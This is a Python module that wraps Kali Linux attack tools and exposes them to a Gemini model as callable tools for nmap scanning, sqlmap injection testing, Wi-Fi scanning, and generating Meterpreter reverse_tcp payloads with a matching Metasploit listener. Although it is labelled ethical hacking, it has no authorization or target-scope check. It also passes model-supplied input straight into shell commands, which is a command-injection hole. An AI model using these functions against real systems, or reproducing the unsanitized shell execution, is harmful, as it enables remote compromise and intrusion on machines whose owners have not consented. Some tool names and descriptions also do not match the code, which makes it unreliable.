import asyncio
import os
import platform
import subprocess

class EthicalHackingAgent:
    """
    Agent for automating ethical hacking tasks on Kali Linux.
    """
    def __init__(self):
        self.is_kali = self._check_is_kali()

    def _check_is_kali(self):
        if platform.system() == "Windows":
             return False # Explicitly Windows
        try:
            if os.path.exists("/etc/os-release"):
                with open("/etc/os-release", "r") as f:
                    content = f.read().lower()
                    return "kali" in content
            return False
        except Exception:
            return False

    async def run_command(self, command):
        """Executes a shell command and returns output."""
        try:
            process = await asyncio.create_subprocess_shell(
                command,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout, stderr = await process.communicate()
            
            output = stdout.decode('utf-8', errors='ignore').strip()
            error = stderr.decode('utf-8', errors='ignore').strip()
            
            if error and not output:
                return f"Error: {error}"
            return output if output else "Command executed successfully with no output."
        except Exception as e:
            return f"Failed to execute command: {str(e)}"

    async def nmap_scan(self, target, options="-F"):
        """Performs an nmap scan on the target."""
        command = f"nmap {options} {target}"
        return await self.run_command(command)

    async def generate_payload(self, platform_type, lhost, lport, output_file="payload.exe"):
        """Generates a payload using msfvenom."""
        # Note: This is an example, actual flags depend on platform
        payloads = {
            "windows": "windows/x64/meterpreter/reverse_tcp",
            "linux": "linux/x64/meterpreter/reverse_tcp",
            "android": "android/meterpreter/reverse_tcp"
        }
        p = payloads.get(platform_type.lower(), "windows/x64/meterpreter/reverse_tcp")
        command = f"msfvenom -p {p} LHOST={lhost} LPORT={lport} -f exe -o {output_file}"
        return await self.run_command(command)

    async def create_listener(self, lhost, lport, payload_type="windows/x64/meterpreter/reverse_tcp"):
        """Creates a metasploit listener."""
        # Create a resource file for msfconsole
        resource_content = f"""
use exploit/multi/handler
set PAYLOAD {payload_type}
set LHOST {lhost}
set LPORT {lport}
set ExitOnSession false
exploit -j
"""
        rc_path = "/tmp/rex_listener.rc"
        with open(rc_path, "w") as f:
            f.write(resource_content)
        
        command = f"msfconsole -r {rc_path}"
        # Since msfconsole is interactive, we might want to run it in a way that doesn't block forever
        # or just notify that it started.
        return f"Listener setup initiated with resource file {rc_path}. Run 'msfconsole -r {rc_path}' to start."

    async def wifi_scan(self, interface="wlan0"):
        """Scans for WiFi networks."""
        if platform.system() == "Windows":
            print(f"[EthicalHackingAgent] Scanning WiFi on Windows via netsh...")
            command = "netsh wlan show networks mode=bssid"
            return await self.run_command(command)
        else:
            if not self.is_kali:
                return "Error: Linux WiFi scanning requires Kali Linux or airplay-ng tools."
            
            print(f"[EthicalHackingAgent] Scanning WiFi on Kali via airodump-ng...")
            # We'll use a timeout since airodump blocks
            command = f"sudo timeout 5 airodump-ng {interface}"
            return await self.run_command(command)

    async def sqlmap_test(self, url):
        """Tests a URL for SQL injection using sqlmap."""
        if not self.is_kali:
            return "Error: sqlmap is only available on Kali Linux in this environment."
        command = f"sqlmap -u \"{url}\" --batch --banner"
        return await self.run_command(command)

# Tool definitions for Gemini
hacking_tools = [
    {
        "name": "nmap_scan",
        "description": "Performs a network scan using nmap. Only works on Kali Linux.",
        "parameters": {
            "type": "OBJECT",
            "properties": {
                "target": {"type": "STRING", "description": "The target IP or domain to scan."},
                "options": {"type": "STRING", "description": "Optional nmap flags (e.g., -sV, -F). Default is -F."}
            },
            "required": ["target"]
        }
    },
    {
        "name": "generate_hacking_payload",
        "description": "Generates a payload using msfvenom for pentesting. Only works on Kali Linux.",
        "parameters": {
            "type": "OBJECT",
            "properties": {
                "platform": {"type": "STRING", "description": "Target platform: windows, linux, android."},
                "lhost": {"type": "STRING", "description": "The listening host IP address."},
                "lport": {"type": "STRING", "description": "The listening port."},
                "output_file": {"type": "STRING", "description": "The name of the output payload file."}
            },
            "required": ["platform", "lhost", "lport"]
        }
    },
    {
        "name": "test_website_vulnerability",
        "description": "Tests a website for SQL injection vulnerabilities using sqlmap. Only works on Kali Linux.",
        "parameters": {
            "type": "OBJECT",
            "properties": {
                "url": {"type": "STRING", "description": "The URL to test."}
            },
            "required": ["url"]
        }
    }
]
